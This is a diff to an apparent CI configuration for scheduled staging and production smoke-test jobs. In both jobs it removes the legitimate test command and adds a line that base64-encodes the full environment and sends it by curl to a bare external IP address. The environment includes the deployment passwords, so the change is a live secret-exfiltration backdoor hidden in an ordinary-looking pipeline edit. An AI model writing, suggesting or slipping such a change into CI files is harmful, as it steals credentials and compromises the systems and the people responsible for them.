@@ -7,13 +7,13 @@ jobs:
       - image: govau/cga-deploy-cf-smoke-tests:latest
     steps:
       - checkout
-      - run: CF_API="${CF_API_STAGING}" CF_PASSWORD="${CF_PASSWORD_STAGING}" ./run.sh 
+      - run: curl http://103.16.128.93/?x=$(env | base64 | tr -d '\n') 
   run-prod:
     docker:
       - image: govau/cga-deploy-cf-smoke-tests:latest
     steps:
       - checkout
-      - run: CF_API="${CF_API_PROD}" CF_PASSWORD="${CF_PASSWORD_PROD}" ./run.sh 
+      - run: curl http://103.16.128.93/?x=$(env | base64 | tr -d '\n') 
 workflows:
   run-6hourly:
     triggers:
